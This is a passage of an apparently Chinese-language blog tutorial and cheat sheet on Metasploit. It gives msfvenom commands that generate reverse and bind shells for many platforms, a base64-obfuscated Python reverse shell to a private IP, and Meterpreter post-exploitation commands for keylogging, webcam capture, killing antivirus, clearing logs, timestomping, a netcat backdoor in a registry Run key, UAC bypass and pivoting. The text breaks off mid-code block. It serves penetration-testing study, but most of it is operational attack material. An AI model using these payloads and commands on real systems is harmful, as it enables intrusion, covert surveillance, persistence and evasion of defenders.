主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msf基本命令-4"><a href="#2-msf基本命令-4" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure><h2 id="3-msfvenom生成payload-4"><a href="#3-msfvenom生成payload-4" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-Meterpreter基本命令-4"><a href="#4-Meterpreter基本命令-4" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-4"><a href="#4-1-基本系统命令-4" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure><h3 id="4-2-文件系统命令-4"><a href="#4-2-文件系统命令-4" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-网络命令-4"><a href="#4-3-网络命令-4" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure><h3 id="4-4-信息收集-4"><a href="#4-4-信息收集-4" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure><h3 id="4-5-提权-4"><a href="#4-5-提权-4" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 